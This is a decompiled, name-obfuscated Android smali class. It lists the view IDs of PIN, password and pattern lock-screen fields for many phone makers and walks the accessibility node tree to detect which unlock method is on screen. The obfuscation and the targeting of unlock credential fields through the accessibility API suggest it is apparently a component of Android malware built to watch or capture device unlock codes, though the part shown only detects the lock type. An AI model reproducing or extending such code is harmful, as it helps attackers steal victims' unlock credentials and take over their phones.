.class public abstract Lڝږ؁ڋ/ؽ;
.super Ljava/lang/Object;
.source "SourceFile"


# static fields
.field public static volatile ؋:Z = false

.field public static volatile ؠ:Ljava/lang/String; = "unknown"

.field public static final ء:Ljava/util/HashSet;

.field public static final آ:Ljava/util/HashSet;

.field public static final أ:Ljava/util/HashSet;


# direct methods
.method public static constructor <clinit>()V
    .locals 29

    new-instance v0, Ljava/util/HashSet;

    const-string v1, "com.android.systemui:id/pinEntry"

    const-string v2, "com.android.systemui:id/pinEntryView"

    const-string v3, "com.android.systemui:id/pin_entry"

    const-string v4, "com.android.systemui:id/simPinEntry"

    const-string v5, "com.android.systemui:id/pukEntry"

    const-string v6, "com.android.keyguard:id/pinEntry"

    const-string v7, "com.samsung.android.keyguard:id/pinEntry"

    const-string v8, "com.samsung.android.keyguard:id/pin_entry"

    const-string v9, "com.sec.android.app.launcher:id/pinEntry"

    const-string v10, "com.miui.keyguard:id/pinEntry"

    const-string v11, "com.miui.keyguard:id/miui_pin_entry"

    const-string v12, "com.miui.keyguard:id/numeric_inputview"

    const-string v13, "com.huawei.keyguard:id/pinEntry"

    const-string v14, "com.huawei.systemui:id/pinEntry"

    const-string v15, "com.vivo.systemui:id/pinEntry"

    const-string v16, "com.bbk.systemui:id/pinEntry"

    const-string v17, "com.oppo.systemui:id/pinEntry"

    const-string v18, "com.oplus.systemui:id/pinEntry"

    const-string v19, "com.coloros.systemui:id/pinEntry"

    const-string v20, "com.oneplus.systemui:id/pinEntry"

    const-string v21, "com.realme.systemui:id/pinEntry"

    const-string v22, "com.motorola.systemui:id/pinEntry"

    const-string v23, "com.sonymobile.systemui:id/pinEntry"

    const-string v24, "com.lge.systemui:id/pinEntry"

    const-string v25, "com.lge.keyguard:id/pinEntry"

    const-string v26, "com.asus.systemui:id/pinEntry"

    const-string v27, "com.lenovo.systemui:id/pinEntry"

    const-string v28, "com.transsion.systemui:id/pinEntry"

    filled-new-array/range {v1 .. v28}, [Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Ljava/util/Arrays;->asList([Ljava/lang/Object;)Ljava/util/List;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/util/HashSet;-><init>(Ljava/util/Collection;)V

    sput-object v0, Lڝږ؁ڋ/ؽ;->ء:Ljava/util/HashSet;

    new-instance v0, Ljava/util/HashSet;

    const-string v1, "com.android.systemui:id/passwordEntry"

    const-string v2, "com.android.systemui:id/passwordEntryView"

    const-string v3, "com.android.systemui:id/passwordInputView"

    const-string v4, "com.android.systemui:id/password_entry"

    const-string v5, "com.android.keyguard:id/passwordEntry"

    const-string v6, "com.samsung.android.keyguard:id/passwordEntry"

    const-string v7, "com.samsung.android.keyguard:id/password_entry"

    const-string v8, "com.sec.android.app.launcher:id/passwordEntry"

    const-string v9, "com.miui.keyguard:id/passwordEntry"

    const-string v10, "com.miui.keyguard:id/miui_password_entry"

    const-string v11, "com.huawei.keyguard:id/passwordEntry"

    const-string v12, "com.huawei.systemui:id/passwordEntry"

    const-string v13, "com.vivo.systemui:id/passwordEntry"

    const-string v14, "com.bbk.systemui:id/passwordEntry"

    const-string v15, "com.oppo.systemui:id/passwordEntry"

    const-string v16, "com.oplus.systemui:id/passwordEntry"

    const-string v17, "com.coloros.systemui:id/passwordEntry"

    const-string v18, "com.oneplus.systemui:id/passwordEntry"

    const-string v19, "com.realme.systemui:id/passwordEntry"

    const-string v20, "com.motorola.systemui:id/passwordEntry"

    const-string v21, "com.sonymobile.systemui:id/passwordEntry"

    const-string v22, "com.lge.systemui:id/passwordEntry"

    const-string v23, "com.lge.keyguard:id/passwordEntry"

    const-string v24, "com.asus.systemui:id/passwordEntry"

    const-string v25, "com.lenovo.systemui:id/passwordEntry"

    const-string v26, "com.transsion.systemui:id/passwordEntry"

    filled-new-array/range {v1 .. v26}, [Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Ljava/util/Arrays;->asList([Ljava/lang/Object;)Ljava/util/List;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/util/HashSet;-><init>(Ljava/util/Collection;)V

    sput-object v0, Lڝږ؁ڋ/ؽ;->آ:Ljava/util/HashSet;

    new-instance v0, Ljava/util/HashSet;

    const-string v1, "com.android.systemui:id/lockPatternView"

    const-string v2, "com.android.systemui:id/patternView"

    const-string v3, "com.android.systemui:id/pattern_view"

    const-string v4, "com.android.systemui:id/colorLockPatternView"

    const-string v5, "com.android.keyguard:id/lockPatternView"

    const-string v6, "com.samsung.android.keyguard:id/lockPatternView"

    const-string v7, "com.samsung.android.keyguard:id/patternView"

    const-string v8, "com.sec.android.app.launcher:id/lockPatternView"

    const-string v9, "com.miui.keyguard:id/lockPatternView"

    const-string v10, "com.miui.keyguard:id/miui_lock_pattern_view"

    const-string v11, "com.huawei.keyguard:id/lockPatternView"

    const-string v12, "com.huawei.systemui:id/lockPatternView"

    const-string v13, "com.vivo.systemui:id/lockPatternView"

    const-string v14, "com.bbk.systemui:id/lockPatternView"

    const-string v15, "com.oppo.systemui:id/lockPatternView"

    const-string v16, "com.oplus.systemui:id/lockPatternView"

    const-string v17, "com.coloros.systemui:id/lockPatternView"

    const-string v18, "com.oneplus.systemui:id/lockPatternView"

    const-string v19, "com.realme.systemui:id/lockPatternView"

    const-string v20, "com.motorola.systemui:id/lockPatternView"

    const-string v21, "com.sonymobile.systemui:id/lockPatternView"

    const-string v22, "com.lge.systemui:id/lockPatternView"

    const-string v23, "com.lge.keyguard:id/lockPatternView"

    const-string v24, "com.asus.systemui:id/lockPatternView"

    const-string v25, "com.lenovo.systemui:id/lockPatternView"

    const-string v26, "com.transsion.systemui:id/lockPatternView"

    filled-new-array/range {v1 .. v26}, [Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Ljava/util/Arrays;->asList([Ljava/lang/Object;)Ljava/util/List;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/util/HashSet;-><init>(Ljava/util/Collection;)V

    sput-object v0, Lڝږ؁ڋ/ؽ;->أ:Ljava/util/HashSet;

    return-void
.end method

.method public static ؋(Landroid/content/Context;)Ljava/lang/String;
    .locals 3

    const-string v0, "unknown"

    :try_start_0
    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object p0

    const-string v1, "lock_detect"

    const/4 v2, 0x0

    invoke-virtual {p0, v1, v2}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object p0

    const-string v1, "using_lock"

    invoke-interface {p0, v1, v0}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p0

    invoke-virtual {v0, p0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_0

    sput-object p0, Lڝږ؁ڋ/ؽ;->ؠ:Ljava/lang/String;

    const/4 v1, 0x1

    sput-boolean v1, Lڝږ؁ڋ/ؽ;->؋:Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_0
    return-object p0

    :catch_0
    return-object v0
.end method

.method public static ؠ(Landroid/view/accessibility/AccessibilityNodeInfo;I)Ljava/lang/String;
    .locals 6

    const/16 v0, 0xc

    const-string v1, "unknown"

    if-le p1, v0, :cond_0

    goto :goto_1

    :cond_0
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_3

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v2

    if-nez v2, :cond_3

    sget-object v2, Lڝږ؁ڋ/ؽ;->ء:Ljava/util/HashSet;

    invoke-virtual {v2, v0}, Ljava/util/HashSet;->contains(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_1

    const-string p0, "pin"

    return-object p0

    :cond_1
    sget-object v2, Lڝږ؁ڋ/ؽ;->آ:Ljava/util/HashSet;

    invoke-virtual {v2, v0}, Ljava/util/HashSet;->contains(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_2

    const-string p0, "password"

    return-object p0

    :cond_2
    sget-object v2, Lڝږ؁ڋ/ؽ;->أ:Ljava/util/HashSet;

    invoke-virtual {v2, v0}, Ljava/util/HashSet;->contains(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_3

    const-string p0, "pattern"

    return-object p0

    :cond_3
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v0

    const/4 v2, 0x0

    :goto_0
    if-ge v2, v0, :cond_6

    invoke-virtual {p0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v3

    if-eqz v3, :cond_5

    add-int/lit8 v4, p1, 0x1

    invoke-static {v3, v4}, Lڝږ؁ڋ/ؽ;->ؠ(Landroid/view/accessibility/AccessibilityNodeInfo;I)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v1, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_4

    :try_start_0
    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-object v4

    :cond_4
    :try_start_1
    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :catch_1
    :cond_5
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    :cond_6
    :goto_1
    return-object v1
.end method
